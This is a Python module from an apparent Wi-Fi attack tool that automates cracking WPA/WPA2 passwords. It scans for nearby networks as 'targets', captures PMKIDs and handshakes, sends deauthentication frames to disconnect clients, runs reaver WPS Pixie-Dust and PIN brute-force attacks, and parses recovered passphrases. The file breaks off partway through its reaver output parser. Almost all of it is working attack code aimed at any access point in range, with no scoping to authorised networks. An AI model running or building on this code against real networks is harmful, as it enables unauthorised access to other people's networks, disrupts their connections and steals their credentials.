"""WPA/WPA2/WPA3 password cracking module.

Orchestrates: hcxdumptool, hcxpcapngtool, hashcat, aircrack-ng, reaver, wash.
Does NOT implement crypto -- wraps proven tools.

Techniques (ordered by effectiveness):
 1. PMKID capture      -- client-less, extract PMKID from AP's first message (~60% of APs)
 2. WPS Pixie-Dust     -- exploits weak RNG in WPS (~30% of WPS-enabled APs, 5-30s)
 3. Hashcat crack      -- GPU-accelerated cracking (PMKID or handshake)
 4. Handshake capture  -- deauth a client, capture 4-way handshake
 5. Hashcat crack      -- GPU-accelerated cracking of handshake
 6. WPS PIN brute      -- brute force 8-digit WPS PIN (2-10 hours, last resort)
 7. Dictionary attack  -- wordlist-based cracking via aircrack-ng (CPU fallback)

On macOS, monitor mode requires a compatible external USB WiFi adapter.
The built-in card does not support it. The module reports this clearly
when no monitor-capable interface is found.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------

class CrackMethod(Enum):
    PMKID = "pmkid_capture"
    HANDSHAKE = "handshake_capture"
    HASHCAT = "hashcat_crack"
    DICTIONARY = "dictionary_attack"
    ONLINE_BRUTE = "online_brute_force"
    WPS_PIXIE = "wps_pixie_dust"
    WPS_PIN = "wps_pin_brute"


@dataclass
class WifiTarget:
    ssid: str
    bssid: str
    channel: int
    security: str  # WPA2, WPA3, WEP, Open
    signal: int  # dBm
    clients: list[str] = field(default_factory=list)  # client MACs
    wps_enabled: bool = False
    wps_locked: bool = False
    wps_version: str = ""


@dataclass
class CrackResult:
    method: CrackMethod
    success: bool
    password: str = ""
    details: str = ""
    capture_file: str = ""
    time_elapsed: float = 0.0


# ---------------------------------------------------------------------------
# Capture directory
# ---------------------------------------------------------------------------

_CAPTURE_DIR = Path.home() / ".nowifi" / "captures"


def _ensure_capture_dir() -> Path:
    """Create the capture directory if it does not exist."""
    _CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    return _CAPTURE_DIR


def _timestamped_dir(prefix: str) -> Path:
    """Create a timestamped subdirectory inside the capture directory."""
    ts = time.strftime("%Y%m%d_%H%M%S")
    d = _ensure_capture_dir() / f"{prefix}_{ts}"
    d.mkdir(parents=True, exist_ok=True)
    return d


# ---------------------------------------------------------------------------
# Tool discovery (matches tunnel.py pattern)
# ---------------------------------------------------------------------------

class ToolNotFound(Exception):
    """External tool not found."""

    def __init__(self, tool: str, install_hint: str):
        self.tool = tool
        self.install_hint = install_hint
        super().__init__(f"{tool} not found. Install: {install_hint}")


def _find_tool(name: str, install_hint: str, extra_paths: list[str] | None = None) -> str:
    """Find an executable by name, checking PATH and common locations.

    Raises ToolNotFound with install instructions if not found.
    """
    candidates: list[str | None] = [shutil.which(name)]
    if extra_paths:
        candidates.extend(extra_paths)
    candidates.extend([
        f"/usr/local/bin/{name}",
        f"/opt/homebrew/bin/{name}",
        os.path.expanduser(f"~/bin/{name}"),
    ])
    for candidate in candidates:
        if candidate and os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    raise ToolNotFound(name, install_hint)


def find_hcxdumptool() -> str:
    """Find hcxdumptool binary."""
    return _find_tool("hcxdumptool", "brew install hcxdumptool  OR  apt install hcxdumptool")


def find_hcxpcapngtool() -> str:
    """Find hcxpcapngtool binary (part of hcxtools)."""
    return _find_tool("hcxpcapngtool", "brew install hcxtools  OR  apt install hcxtools")


def find_hashcat() -> str:
    """Find hashcat binary."""
    return _find_tool("hashcat", "brew install hashcat  OR  apt install hashcat")


def find_aircrack() -> str:
    """Find aircrack-ng binary."""
    return _find_tool("aircrack-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")


def find_airodump() -> str:
    """Find airodump-ng binary."""
    return _find_tool("airodump-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")


def find_aireplay() -> str:
    """Find aireplay-ng binary."""
    return _find_tool("aireplay-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")


def find_reaver() -> str:
    """Find reaver binary."""
    from .toolchain import find_tool
    path = find_tool("reaver")
    if path:
        return path
    raise ToolNotFound("reaver", "brew install reaver  OR  apt install reaver")


def find_wash() -> str:
    """Find wash binary (part of reaver package, detects WPS-enabled APs)."""
    from .toolchain import find_tool
    path = find_tool("wash")
    if path:
        return path
    raise ToolNotFound("wash", "Installed with reaver: brew install reaver")


# ---------------------------------------------------------------------------
# Monitor mode helpers
# ---------------------------------------------------------------------------

def _check_monitor_mode(interface: str) -> bool:
    """Check if interface supports or is already in monitor mode.

    On macOS the built-in WiFi card does not support monitor mode.
    An external USB adapter (e.g., Alfa AWUS036ACH) is required.
    """
    try:
        result = subprocess.run(
            ["ifconfig", interface],
            capture_output=True, text=True, timeout=5,
        )
        # On Linux, monitor mode shows as "Mode:Monitor" in iwconfig
        # On macOS, there is no native monitor mode indicator for en0
        if "monitor" in result.stdout.lower():
            return True
    except (subprocess.TimeoutExpired, OSError):
        pass

    # Try iwconfig (Linux)
    try:
        result = subprocess.run(
            ["iwconfig", interface],
            capture_output=True, text=True, timeout=5,
        )
        if "Mode:Monitor" in result.stdout:
            return True
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    return False


def _is_macos() -> bool:
    """Check if running on macOS."""
    import platform
    return platform.system() == "Darwin"


# ---------------------------------------------------------------------------
# Subprocess timeout helpers
# ---------------------------------------------------------------------------

def _terminate_process(proc: subprocess.Popen, wait_timeout: int = 5) -> None:
    """Terminate a subprocess and force-kill it if it does not exit promptly."""
    proc.terminate()
    try:
        proc.wait(timeout=wait_timeout)
    except subprocess.TimeoutExpired:
        proc.kill()


def _wait_for_process(
    proc: subprocess.Popen,
    timeout: int,
    terminate_timeout: int = 5,
) -> None:
    """Wait for a subprocess, terminating it on timeout."""
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        _terminate_process(proc, wait_timeout=terminate_timeout)


def _communicate_with_timeout(
    proc: subprocess.Popen,
    timeout: int,
    terminate_timeout: int = 5,
) -> tuple[bytes, bytes]:
    """Read subprocess output, terminating it on timeout."""
    try:
        stdout_data, stderr_data = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        _terminate_process(proc, wait_timeout=terminate_timeout)
        stdout_data = proc.stdout.read() if proc.stdout else b""
        stderr_data = proc.stderr.read() if proc.stderr else b""
    return stdout_data or b"", stderr_data or b""


# ---------------------------------------------------------------------------
# Scanning
# ---------------------------------------------------------------------------

_BSSID_RE = re.compile(r"([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}")


def scan_targets(interface: str = "en0", duration: int = 10) -> list[WifiTarget]:
    """Scan for WiFi networks and identify crackable targets.

    Uses system_profiler on macOS (passive, no monitor mode needed).
    Uses iw/iwlist on Linux.
    Returns list of WifiTarget sorted by signal strength (strongest first).
    """
    targets: list[WifiTarget] = []

    if _is_macos():
        targets = _scan_macos(interface)
    else:
        targets = _scan_linux(interface, duration)

    # Sort by signal strength (strongest first, dBm is negative)
    targets.sort(key=lambda t: t.signal, reverse=True)
    return targets


def _scan_macos(interface: str) -> list[WifiTarget]:
    """Scan using system_profiler SPAirPortDataType on macOS."""
    import json as _json

    targets: list[WifiTarget] = []

    try:
        result = subprocess.run(
            ["system_profiler", "SPAirPortDataType", "-json"],
            capture_output=True, text=True, timeout=15,
        )
        data = _json.loads(result.stdout)

        for item in data.get("SPAirPortDataType", []):
            interfaces = item.get("spairport_airport_interfaces", [])
            for iface in interfaces:
                # Other networks visible in the scan
                other_networks = iface.get("spairport_airport_other_local_wireless_networks", [])
                for net in other_networks:
                    ssid = net.get("_name", "")
                    if not ssid:
                        continue

                    bssid = net.get("spairport_network_bssid", "")
                    channel_str = str(net.get("spairport_network_channel", "0"))
                    # Channel string can be "6" or "6, 40MHz" -- extract number
                    channel = int(re.match(r"(\d+)", channel_str).group(1)) if re.match(r"(\d+)", channel_str) else 0
                    security = net.get("spairport_security_mode", "unknown")
                    signal = -99
                    signal_raw = net.get("spairport_signal_noise", "")
                    if signal_raw:
                        try:
                            signal = int(str(signal_raw).split()[0])
                        except (ValueError, IndexError):
                            pass

                    targets.append(WifiTarget(
                        ssid=ssid,
                        bssid=bssid,
                        channel=channel,
                        security=security,
                        signal=signal,
                    ))

                # Also include the currently connected network
                current = iface.get("spairport_current_network_information", {})
                if current:
                    ssid = current.get("_name", "")
                    if ssid:
                        bssid = current.get("spairport_network_bssid", "")
                        channel_str = str(current.get("spairport_network_channel", "0"))
                        channel = int(re.match(r"(\d+)", channel_str).group(1)) if re.match(r"(\d+)", channel_str) else 0
                        security = current.get("spairport_security_mode", "unknown")
                        signal = -99
                        signal_raw = current.get("spairport_signal_noise", "")
                        if signal_raw:
                            try:
                                signal = int(str(signal_raw).split()[0])
                            except (ValueError, IndexError):
                                pass
                        targets.append(WifiTarget(
                            ssid=ssid,
                            bssid=bssid,
                            channel=channel,
                            security=security,
                            signal=signal,
                        ))
    except (subprocess.TimeoutExpired, Exception):
        pass

    # Also try the airport utility for scan results
    if not targets:
        targets = _scan_macos_airport()

    return targets


def _scan_macos_airport() -> list[WifiTarget]:
    """Fallback: scan using the airport utility on macOS."""
    targets: list[WifiTarget] = []
    airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

    try:
        result = subprocess.run(
            [airport_path, "-s"],
            capture_output=True, text=True, timeout=15,
        )
        # Parse airport -s output: SSID BSSID RSSI CHANNEL HT CC SECURITY
        for line in result.stdout.splitlines()[1:]:  # Skip header
            parts = line.split()
            if len(parts) < 7:
                continue
            # SSID may contain spaces, BSSID is always in MAC format
            # Find the BSSID in the line (first MAC-like string)
            bssid_match = _BSSID_RE.search(line)
            if not bssid_match:
                continue

            bssid = bssid_match.group(0)
            bssid_pos = line.index(bssid)
            ssid = line[:bssid_pos].strip()
            remainder = line[bssid_pos + len(bssid):].strip().split()

            if len(remainder) < 4:
                continue

            try:
                rssi = int(remainder[0])
                channel = int(remainder[1])
            except (ValueError, IndexError):
                continue

            security = " ".join(remainder[3:]) if len(remainder) > 3 else "unknown"

            targets.append(WifiTarget(
                ssid=ssid,
                bssid=bssid,
                channel=channel,
                security=security,
                signal=rssi,
            ))
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    return targets


def _scan_linux(interface: str, duration: int) -> list[WifiTarget]:
    """Scan using iw on Linux."""
    targets: list[WifiTarget] = []

    try:
        # Trigger a scan
        subprocess.run(
            ["sudo", "iw", "dev", interface, "scan"],
            capture_output=True, text=True, timeout=duration + 10,
        )
        # Parse scan results
        result = subprocess.run(
            ["sudo", "iw", "dev", interface, "scan", "dump"],
            capture_output=True, text=True, timeout=10,
        )

        current: dict[str, str | int] = {}
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("BSS "):
                # Save previous entry
                if current.get("bssid"):
                    targets.append(WifiTarget(
                        ssid=str(current.get("ssid", "")),
                        bssid=str(current["bssid"]),
                        channel=int(current.get("channel", 0)),
                        security=str(current.get("security", "unknown")),
                        signal=int(current.get("signal", -99)),
                    ))
                bssid_match = _BSSID_RE.search(line)
                current = {"bssid": bssid_match.group(0) if bssid_match else ""}
            elif line.startswith("SSID:"):
                current["ssid"] = line[5:].strip()
            elif line.startswith("signal:"):
                try:
                    current["signal"] = int(float(line.split(":")[1].strip().split()[0]))
                except (ValueError, IndexError):
                    pass
            elif line.startswith("DS Parameter set: channel"):
                try:
                    current["channel"] = int(line.split("channel")[1].strip())
                except (ValueError, IndexError):
                    pass
            elif "WPA" in line or "RSN" in line:
                current["security"] = "WPA2" if "RSN" in line else "WPA"

        # Final entry
        if current.get("bssid"):
            targets.append(WifiTarget(
                ssid=str(current.get("ssid", "")),
                bssid=str(current["bssid"]),
                channel=int(current.get("channel", 0)),
                security=str(current.get("security", "unknown")),
                signal=int(current.get("signal", -99)),
            ))
    except (subprocess.TimeoutExpired, OSError):
        pass

    return targets


# ---------------------------------------------------------------------------
# PMKID capture
# ---------------------------------------------------------------------------

def capture_pmkid(
    target: WifiTarget,
    interface: str,
    output_dir: Path | None = None,
    timeout: int = 60,
) -> CrackResult:
    """Capture PMKID from target AP using hcxdumptool.

    PMKID is extracted from the AP's first EAPOL message during association.
    Does NOT require any connected clients -- just associate and capture.
    Approximately 60% of APs are vulnerable.

    Args:
        target: The WiFi target (SSID, BSSID, channel).
        interface: Monitor-mode capable interface.
        output_dir: Directory for capture files (default: ~/.nowifi/captures/).
        timeout: Seconds to wait for PMKID capture.

    Returns:
        CrackResult with capture_file set if PMKID was captured.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.PMKID, success=False)

    if output_dir is None:
        output_dir = _timestamped_dir("pmkid")

    # Check monitor mode
    if not _check_monitor_mode(interface):
        if _is_macos():
            result.details = (
                "Monitor mode not available. macOS built-in WiFi does not support "
                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
            )
        else:
            result.details = (
                f"Interface {interface} is not in monitor mode. "
                f"Run: sudo airmon-ng start {interface}"
            )
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Find tools
    try:
        hcxdumptool = find_hcxdumptool()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    try:
        hcxpcapngtool = find_hcxpcapngtool()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Write filterlist (target BSSID)
    filterlist = output_dir / "filterlist.txt"
    # hcxdumptool expects BSSID without colons
    bssid_clean = target.bssid.replace(":", "").replace("-", "").lower()
    filterlist.write_text(bssid_clean + "\n")

    capture_file = output_dir / "capture.pcapng"

    # Run hcxdumptool
    cmd = [
        hcxdumptool,
        "-i", interface,
        "-o", str(capture_file),
        f"--filterlist_ap={filterlist}",
        "--filtermode=2",        # Only capture from listed APs
        "--enable_status=1",     # Status messages to stderr
    ]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    # Wait for PMKID capture or timeout
    _wait_for_process(proc, timeout=timeout)

    stderr_output = proc.stderr.read().decode(errors="replace") if proc.stderr else ""

    # Check if we got a capture file
    if not capture_file.exists() or capture_file.stat().st_size == 0:
        result.details = f"No PMKID captured within {timeout}s. {stderr_output[:200]}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Convert pcapng to hashcat format using hcxpcapngtool
    hash_file = output_dir / "hash.22000"
    conv_result = subprocess.run(
        [hcxpcapngtool, "-o", str(hash_file), str(capture_file)],
        capture_output=True, text=True, timeout=30,
    )

    if not hash_file.exists() or hash_file.stat().st_size == 0:
        result.details = f"Captured traffic but no PMKID extracted. {conv_result.stderr[:200]}"
        result.capture_file = str(capture_file)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Count PMKIDs extracted
    pmkid_count = 0
    try:
        with open(hash_file) as f:
            pmkid_count = sum(1 for line in f if line.strip())
    except OSError:
        pass

    result.success = True
    result.capture_file = str(hash_file)
    result.details = f"Captured {pmkid_count} PMKID(s) from {target.ssid} ({target.bssid})"
    result.time_elapsed = time.monotonic() - start_time
    return result


# ---------------------------------------------------------------------------
# Handshake capture
# ---------------------------------------------------------------------------

def capture_handshake(
    target: WifiTarget,
    interface: str,
    output_dir: Path | None = None,
    timeout: int = 120,
) -> CrackResult:
    """Capture WPA 4-way handshake by deauthing a client.

    Requires at least one client connected to the target AP.
    Sends deauth frames to disconnect a client, then captures the
    handshake when the client reconnects.

    Args:
        target: The WiFi target (must have clients).
        interface: Monitor-mode capable interface.
        output_dir: Directory for capture files.
        timeout: Seconds to wait for handshake capture.

    Returns:
        CrackResult with capture_file set if handshake was captured.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.HANDSHAKE, success=False)

    if output_dir is None:
        output_dir = _timestamped_dir("handshake")

    # Check monitor mode
    if not _check_monitor_mode(interface):
        if _is_macos():
            result.details = (
                "Monitor mode not available. macOS built-in WiFi does not support "
                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
            )
        else:
            result.details = (
                f"Interface {interface} is not in monitor mode. "
                f"Run: sudo airmon-ng start {interface}"
            )
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Prefer hcxdumptool (handles deauth + capture in one tool)
    try:
        return _capture_handshake_hcx(target, interface, output_dir, timeout, start_time)
    except ToolNotFound:
        pass

    # Fallback: airodump-ng + aireplay-ng
    try:
        return _capture_handshake_aircrack(target, interface, output_dir, timeout, start_time)
    except ToolNotFound as e:
        result.details = f"No capture tools available. {e}"
        result.time_elapsed = time.monotonic() - start_time
        return result


def _capture_handshake_hcx(
    target: WifiTarget,
    interface: str,
    output_dir: Path,
    timeout: int,
    start_time: float,
) -> CrackResult:
    """Capture handshake using hcxdumptool (handles deauth internally)."""
    hcxdumptool = find_hcxdumptool()
    hcxpcapngtool = find_hcxpcapngtool()

    result = CrackResult(method=CrackMethod.HANDSHAKE, success=False)

    filterlist = output_dir / "filterlist.txt"
    bssid_clean = target.bssid.replace(":", "").replace("-", "").lower()
    filterlist.write_text(bssid_clean + "\n")

    capture_file = output_dir / "capture.pcapng"

    cmd = [
        hcxdumptool,
        "-i", interface,
        "-o", str(capture_file),
        f"--filterlist_ap={filterlist}",
        "--filtermode=2",
        "--enable_status=1",
        "--active_beacon",       # Send beacon to provoke responses
        "--deauthentication",    # Send deauth to force reconnection
    ]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    _wait_for_process(proc, timeout=timeout)

    stderr_output = proc.stderr.read().decode(errors="replace") if proc.stderr else ""

    if not capture_file.exists() or capture_file.stat().st_size == 0:
        result.details = f"No handshake captured within {timeout}s. {stderr_output[:200]}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Convert to hashcat format
    hash_file = output_dir / "hash.22000"
    subprocess.run(
        [hcxpcapngtool, "-o", str(hash_file), str(capture_file)],
        capture_output=True, text=True, timeout=30,
    )

    if not hash_file.exists() or hash_file.stat().st_size == 0:
        result.details = f"Captured traffic but no valid handshake extracted. {stderr_output[:200]}"
        result.capture_file = str(capture_file)
        result.time_elapsed = time.monotonic() - start_time
        return result

    hash_count = 0
    try:
        with open(hash_file) as f:
            hash_count = sum(1 for line in f if line.strip())
    except OSError:
        pass

    result.success = True
    result.capture_file = str(hash_file)
    result.details = f"Captured {hash_count} handshake(s) from {target.ssid} ({target.bssid})"
    result.time_elapsed = time.monotonic() - start_time
    return result


def _capture_handshake_aircrack(
    target: WifiTarget,
    interface: str,
    output_dir: Path,
    timeout: int,
    start_time: float,
) -> CrackResult:
    """Capture handshake using airodump-ng + aireplay-ng (aircrack-ng suite)."""
    airodump = find_airodump()
    aireplay = find_aireplay()

    result = CrackResult(method=CrackMethod.HANDSHAKE, success=False)

    capture_prefix = str(output_dir / "capture")

    # Start airodump-ng to capture traffic on the target channel
    airodump_proc = subprocess.Popen(
        [
            airodump,
            "-c", str(target.channel),
            "--bssid", target.bssid,
            "-w", capture_prefix,
            "--output-format", "pcap",
            interface,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    # Give airodump time to start capturing
    time.sleep(3)

    # Send deauth to a client (or broadcast if no specific client known)
    deauth_target = target.clients[0] if target.clients else "FF:FF:FF:FF:FF:FF"
    try:
        subprocess.run(
            [
                aireplay,
                "--deauth", "5",
                "-a", target.bssid,
                "-c", deauth_target,
                interface,
            ],
            capture_output=True, text=True,
            timeout=30,
        )
    except (subprocess.TimeoutExpired, OSError):
        pass

    # Wait for handshake
    remaining = max(1, timeout - int(time.monotonic() - start_time))
    _wait_for_process(airodump_proc, timeout=remaining)

    # Look for the capture file (airodump adds -01.cap suffix)
    cap_file = None
    for suffix in ["-01.cap", "-01.pcap", "-01.pcapng"]:
        candidate = Path(capture_prefix + suffix)
        if candidate.exists() and candidate.stat().st_size > 0:
            cap_file = candidate
            break

    if cap_file is None:
        result.details = "No capture file produced by airodump-ng"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Try to convert to hashcat format if hcxpcapngtool is available
    try:
        hcxpcapngtool = find_hcxpcapngtool()
        hash_file = output_dir / "hash.22000"
        subprocess.run(
            [hcxpcapngtool, "-o", str(hash_file), str(cap_file)],
            capture_output=True, text=True, timeout=30,
        )
        if hash_file.exists() and hash_file.stat().st_size > 0:
            result.success = True
            result.capture_file = str(hash_file)
            result.details = f"Handshake captured from {target.ssid} ({target.bssid})"
            result.time_elapsed = time.monotonic() - start_time
            return result
    except ToolNotFound:
        pass

    # Fall back to raw cap file (can be used with aircrack-ng directly)
    result.success = True
    result.capture_file = str(cap_file)
    result.details = f"Handshake captured (raw pcap) from {target.ssid} ({target.bssid})"
    result.time_elapsed = time.monotonic() - start_time
    return result


# ---------------------------------------------------------------------------
# WPS scanning and attacks
# ---------------------------------------------------------------------------

def scan_wps_targets(interface: str, timeout: int = 15) -> list[WifiTarget]:
    """Scan for WPS-enabled access points using wash.

    wash -i {interface} -s  (requires monitor mode)
    Parse output: BSSID, channel, RSSI, WPS version, WPS locked, ESSID

    Falls back to reaver --wash mode if wash binary is unavailable.

    Args:
        interface: Monitor-mode interface name.
        timeout: Seconds to scan before stopping wash.

    Returns:
        List of WifiTarget with wps_enabled=True for APs that advertise WPS.
    """
    targets: list[WifiTarget] = []

    # Try wash first (preferred, part of reaver package)
    wash_path: str | None = None
    try:
        wash_path = find_wash()
    except ToolNotFound:
        pass

    if wash_path:
        proc = subprocess.Popen(
            [wash_path, "-i", interface, "-s"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        _wait_for_process(proc, timeout=timeout)

        stdout_data = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
        targets = _parse_wash_output(stdout_data)
        if targets:
            return targets

    # Fallback: reaver with --wash flag (same output format)
    try:
        reaver_path = find_reaver()
    except ToolNotFound:
        return targets

    proc = subprocess.Popen(
        [reaver_path, "-i", interface, "--wash"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    _wait_for_process(proc, timeout=timeout)

    stdout_data = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
    targets = _parse_wash_output(stdout_data)
    return targets


def _parse_wash_output(output: str) -> list[WifiTarget]:
    """Parse wash/reaver --wash output into WifiTarget list.

    Typical wash output format:
    BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
    AA:BB:CC:DD:EE:FF    6  -45  1.0  No   RalinkTe  MyNetwork
    """
    targets: list[WifiTarget] = []
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID") or line.startswith("---"):
            continue

        bssid_match = _BSSID_RE.match(line)
        if not bssid_match:
            continue

        bssid = bssid_match.group(0)
        remainder = line[len(bssid):].strip()
        parts = remainder.split()

        if len(parts) < 5:
            continue

        try:
            channel = int(parts[0])
            signal = int(parts[1])
        except (ValueError, IndexError):
            continue

        wps_version = parts[2] if len(parts) > 2 else ""
        wps_locked = parts[3].lower() == "yes" if len(parts) > 3 else False
        # ESSID is everything after the vendor field (parts[5:])
        # vendor is parts[4], ESSID is parts[5:]
        essid = " ".join(parts[5:]) if len(parts) > 5 else ""

        targets.append(WifiTarget(
            ssid=essid,
            bssid=bssid,
            channel=channel,
            security="WPA/WPA2",  # WPS implies WPA
            signal=signal,
            wps_enabled=True,
            wps_locked=wps_locked,
            wps_version=wps_version,
        ))

    return targets


def crack_wps_pixie(
    target: WifiTarget,
    interface: str,
    output_dir: Path | None = None,
    timeout: int = 300,
) -> CrackResult:
    """WPS Pixie-Dust attack using reaver.

    reaver -i {interface} -b {bssid} -c {channel} -K 1 -vv

    Exploits weak random number generation in WPS implementations.
    Takes 5-30 seconds when vulnerable (vs hours for PIN brute force).
    Approximately 30% of WPS-enabled APs are vulnerable.

    Args:
        target: WiFi target (should have wps_enabled=True).
        interface: Monitor-mode capable interface.
        output_dir: Directory for output files.
        timeout: Seconds to wait (Pixie-Dust is fast, 300s is generous).

    Returns:
        CrackResult with password if the WPS PIN and WPA PSK were recovered.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.WPS_PIXIE, success=False)

    if output_dir is None:
        output_dir = _timestamped_dir("wps_pixie")

    # Check monitor mode
    if not _check_monitor_mode(interface):
        if _is_macos():
            result.details = (
                "Monitor mode not available. macOS built-in WiFi does not support "
                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
            )
        else:
            result.details = (
                f"Interface {interface} is not in monitor mode. "
                f"Run: sudo airmon-ng start {interface}"
            )
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Find reaver
    try:
        reaver_path = find_reaver()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Skip if WPS is known to be locked
    if target.wps_locked:
        result.details = f"WPS is locked on {target.ssid} ({target.bssid}) -- skipping Pixie-Dust"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Build reaver command: Pixie-Dust mode (-K 1)
    cmd = [
        reaver_path,
        "-i", interface,
        "-b", target.bssid,
        "-c", str(target.channel),
        "-K", "1",       # Pixie-Dust attack
        "-vv",           # Verbose output for parsing
    ]

    output_file = output_dir / "reaver_pixie.log"

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    stdout_data, _ = _communicate_with_timeout(proc, timeout=timeout, terminate_timeout=10)

    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""

    # Save log
    output_file.write_text(stdout_text)

    # Parse reaver output for WPS PIN and WPA PSK
    wps_pin, wpa_psk = _parse_reaver_output(stdout_text)

    if wpa_psk:
        result.success = True
        result.password = wpa_psk
        result.details = f"Pixie-Dust recovered WPA PSK from {target.ssid} (WPS PIN: {wps_pin})"
        result.capture_file = str(output_file)
    elif wps_pin:
        result.success = True
        result.password = ""
        result.details = f"Pixie-Dust recovered WPS PIN: {wps_pin} (but no PSK in output)"
        result.capture_file = str(output_file)
    else:
        # Check for common failure reasons
        if "WPS transaction failed" in stdout_text:
            result.details = "WPS transaction failed -- AP may have rate limiting"
        elif "WPS pin not found" in stdout_text or "Failed to recover" in stdout_text:
            result.details = "Pixie-Dust failed -- AP not vulnerable to weak RNG attack"
        else:
            result.details = f"Pixie-Dust did not recover credentials. {stdout_text[-200:]}"

    result.time_elapsed = time.monotonic() - start_time
    return result


def crack_wps_pin(
    target: WifiTarget,
    interface: str,
    output_dir: Path | None = None,
    timeout: int = 3600,
) -> CrackResult:
    """WPS PIN brute force using reaver.

    reaver -i {interface} -b {bssid} -c {channel} -vv

    Brute forces the 8-digit WPS PIN (effectively 11000 combinations due to
    checksum digit + split verification). Can take 2-10 hours.
    Only use as last resort.

    Args:
        target: WiFi target (should have wps_enabled=True).
        interface: Monitor-mode capable interface.
        output_dir: Directory for output files.
        timeout: Max seconds for brute force (default 3600 = 1 hour).

    Returns:
        CrackResult with password if the WPS PIN and WPA PSK were recovered.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.WPS_PIN, success=False)

    if output_dir is None:
        output_dir = _timestamped_dir("wps_pin")

    # Check monitor mode
    if not _check_monitor_mode(interface):
        if _is_macos():
            result.details = (
                "Monitor mode not available. macOS built-in WiFi does not support "
                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
            )
        else:
            result.details = (
                f"Interface {interface} is not in monitor mode. "
                f"Run: sudo airmon-ng start {interface}"
            )
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Find reaver
    try:
        reaver_path = find_reaver()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Skip if WPS is known to be locked
    if target.wps_locked:
        result.details = f"WPS is locked on {target.ssid} ({target.bssid}) -- PIN brute force blocked"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Build reaver command: full PIN brute force (no -K flag)
    cmd = [
        reaver_path,
        "-i", interface,
        "-b", target.bssid,
        "-c", str(target.channel),
        "-vv",           # Verbose output for parsing
        "-d", "2",       # 2 second delay between PINs (avoid lockout)
        "-N",            # Don't send NACK packets (more reliable)
    ]

    output_file = output_dir / "reaver_pin.log"

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    stdout_data, _ = _communicate_with_timeout(proc, timeout=timeout, terminate_timeout=10)

    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""

    # Save log
    output_file.write_text(stdout_text)

    # Parse reaver output
    wps_pin, wpa_psk = _parse_reaver_output(stdout_text)

    if wpa_psk:
        result.success = True
        result.password = wpa_psk
        result.details = f"WPS PIN brute force recovered PSK from {target.ssid} (PIN: {wps_pin})"
        result.capture_file = str(output_file)
    elif wps_pin:
        result.success = True
        result.password = ""
        result.details = f"WPS PIN recovered: {wps_pin} (but no PSK in output)"
        result.capture_file = str(output_file)
    else:
        if "WPS pin not found" in stdout_text:
            result.details = "WPS PIN brute force exhausted all PINs without success"
        elif "locked" in stdout_text.lower():
            result.details = "AP locked WPS after too many attempts"
        elif proc.returncode is not None and proc.returncode != 0:
            result.details = f"Reaver exited with code {proc.returncode}. {stdout_text[-200:]}"
        else:
            result.details = f"WPS PIN brute force timed out after {timeout}s"

    result.time_elapsed = time.monotonic() - start_time
    return result


def _parse_reaver_output(output: str) -> tuple[str, str]:
    """Parse reaver stdout for WPS PIN and WPA PSK.

    Reaver prints:
      [+] WPS PIN: '12345670'
      [+] WPA PSK: 'MyPassword123'
      or
      [+] Pin cracked in X seconds
      [+] WPS PIN: XXXXXXXX
      [+] AP SSID: NetworkName
      [+] WPA PSK: password

    Returns:
        Tuple of (wps_pin, wpa_psk). Either or both may be empty string.
    """
    wps_pin = ""
